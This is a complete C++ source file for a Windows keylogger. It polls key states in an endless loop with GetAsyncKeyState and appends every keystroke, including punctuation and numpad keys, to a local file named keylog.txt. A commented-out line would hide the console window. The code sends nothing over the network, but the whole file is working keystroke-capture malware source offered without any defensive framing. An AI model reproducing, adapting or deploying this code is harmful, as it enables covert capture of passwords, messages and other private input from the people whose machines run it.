#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;


void Log(string input){
	fstream LogFile;
	LogFile.open("keylog.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int);
int keylog1(); // ~
int keylog2(); // '
int keylog3(); // ]
int keylog4(); // [
int keylog5(); // - 
int keylog6(); // =
int keylog7(); // ;
int keylog8(); // "\"
int keylog9(); // /
int keylog10(); //  .
int keylog11(); // ,
int extra();
bool OEM_3 = false; // ~
bool OEM_6 = false; //]
bool OEM_4 = false; //[
bool OEM_MINUS =false; // -
bool OEM_1 = false; //;
bool OEM_5 = false; // "\"
bool OEM_2 = false; // /
bool OEM_PERIOD = false; //.
bool OEM_COMMA = false; //,
bool OEM_PLUS = false; //=
bool OEM_7 = false; // "

int main(){
	
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY;
	
	while (true) {
		//Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++){
			if (GetAsyncKeyState(KEY) == -32767){ //When you press.
				if (SpecialKeys(KEY) == false){ //check S_Key.

					fstream LogFile;
					LogFile.open("keylog.txt", fstream::app);
					
					if (LogFile.is_open()) {
						LogFile << char(KEY+32);
						LogFile.close();
					}	
				}
				extra();
			}
			/*if(GetAsyncKeyState(VK_SHIFT) == -32768 ){
				if (GetAsyncKeyState(KEY) == -32767 ){
					fstream LogFile;
					LogFile.open("keylog.txt", fstream::app);
					
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}*/
		}
	}
	return 0;
}

bool SpecialKeys(int S_Key){
	switch (S_Key){
	case VK_SHIFT:
		cout << "shift";
		Log("shift");
		return true;
	case VK_BACK:
		cout << " delete ";
		Log(" delete ");
		return true;
	case VK_TAB:
		cout << "	";
		Log("	");
		return true;
	case VK_SPACE:
		cout << " ";
		Log(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		Log("\n");
		return true;
	case VK_NUMPAD0:
		cout << "0";
		Log("0");
		return true;
	case VK_NUMPAD1:
		cout << "1";
		Log("1");
		return true;
	case VK_NUMPAD2:
		cout << "2";
		Log("2");
		return true;
	case VK_NUMPAD3:
		cout << "3";
		Log("3");
		return true;
	case VK_NUMPAD4:
		cout << "4";
		Log("4");
		return true;
	case VK_NUMPAD5:
		cout << "5";
		Log("5");
		return true;
	case VK_NUMPAD6:
		cout << "6";
		Log("6");
		return true;
	case VK_NUMPAD7:
		cout << "7";
		Log("7");
		return true;
	case VK_NUMPAD8:
		cout << "8";
		Log("8");
		return true;
	case VK_NUMPAD9:
		cout << "9";
		Log("9");
		return true;
	case VK_ADD:
		cout << "+";
		Log("+");
		return true;
	case VK_SUBTRACT:
		cout << "-";
		Log("-");
		return true;
	default: 
		return false;
	}
}

int keylog1(){ //VK_OEM_3
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("~");
	LogFile.close();
}

int keylog2(){ //VK_OEM_7
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("'");
	LogFile.close();
}

int keylog3(){ //VK_OEM_6
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("]");
	LogFile.close();
}

int keylog4(){ //VK_OEM_4
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("[");
	LogFile.close();
}

int keylog5(){ //VK_OEM_MINUS
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("-");
	LogFile.close();
}

int keylog6(){ //VK_OEM_PLUS
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("=");
	LogFile.close();
}

int keylog7(){ //VK_OEM_1
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log(";");
	LogFile.close();
}

int keylog8(){ //VK_OEM_5
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("\\");
	LogFile.close();
}

int keylog9(){ //VK_OEM_2
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log("/");
	LogFile.close();
}

int keylog10(){ //VK_OEM_PERIOD
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log(".");
	LogFile.close();
}

int keylog11(){ //VK_EOM_COMMA
	fstream LogFile;
	LogFile.open("keylog.txt",fstream::app);
	Log(",");
	LogFile.close();
}



int extra(){
	
	  if (GetAsyncKeyState(VK_OEM_3) < 0 && OEM_3 == false)
    {
      //Press down
      OEM_3 = true;
      keylog1();
      cout << "[Change Language]" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_3) >= 0 && OEM_3 == true){
      //Release
      OEM_3 = false;

    	}
	//////////////////////////////////////////////////////////
	
		  if (GetAsyncKeyState(VK_OEM_6) < 0 && OEM_6 == false)
    {
      //Press down
      OEM_6 = true;
      keylog3();
      cout << "]" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_6) >= 0 && OEM_6 == true){
      //Release
      OEM_6 = false;

    	}
	//////////////////////////////////////////////////////////	 
		  
		  if (GetAsyncKeyState(VK_OEM_4) < 0 && OEM_4 == false)
    {
      //Press down
      OEM_4 = true;
      keylog4();
      cout << "[" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_4) >= 0 && OEM_4 == true){
      //Release
      OEM_4 = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_1) < 0 && OEM_1 == false)
    {
      //Press down
      OEM_1 = true;
      keylog7();
      cout << ";" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_1) >= 0 && OEM_1 == true){
      //Release
      OEM_1 = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_5) < 0 && OEM_5 == false)
    {
      //Press down
      OEM_5 = true;
      keylog8();
      cout << "\\" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_5) >= 0 && OEM_5 == true){
      //Release
      OEM_5 = false;

    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_2) < 0 && OEM_2 == false)
    {
      //Press down
      OEM_2 = true;
      keylog9();
      cout << "/" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_2) >= 0 && OEM_2 == true){
      //Release
      OEM_2 = false;

    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_MINUS) < 0 && OEM_MINUS == false)
    {
      //Press down
      OEM_MINUS = true;
      keylog5();
      cout << "-" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_MINUS) >= 0 && OEM_MINUS == true){
      //Release
      OEM_MINUS = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_PERIOD) < 0 && OEM_PERIOD == false)
    {
      //Press down
      OEM_PERIOD = true;
      keylog10();
      cout << "." << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_PERIOD) >= 0 && OEM_PERIOD == true){
      //Release
      OEM_PERIOD = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_COMMA) < 0 && OEM_COMMA == false)
    {
      //Press down
      OEM_COMMA = true;
      keylog11();
      cout << "," << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_COMMA) >= 0 && OEM_COMMA == true){
      //Release
      OEM_COMMA = false;
      
    	}  
	///////////////////////////////////////////////////////
		
		if (GetAsyncKeyState(VK_OEM_PLUS) < 0 && OEM_PLUS == false)
    {
      //Press down
      OEM_PLUS = true;
      keylog6();
      cout << "=" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_PLUS) >= 0 && OEM_PLUS == true){
      //Release
      OEM_PLUS = false;
      
    	}
    /////////////////////////////////////////////////////////
    
    
    	if (GetAsyncKeyState(VK_OEM_7) < 0 && OEM_7 == false)
    {
      //Press down
      OEM_7 = true;
      keylog2();
      cout << "'" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_7) >= 0 && OEM_7 == true){
      //Release
      OEM_7 = false;
      
    	}
    /////////////////////////////////////////////////////////
}
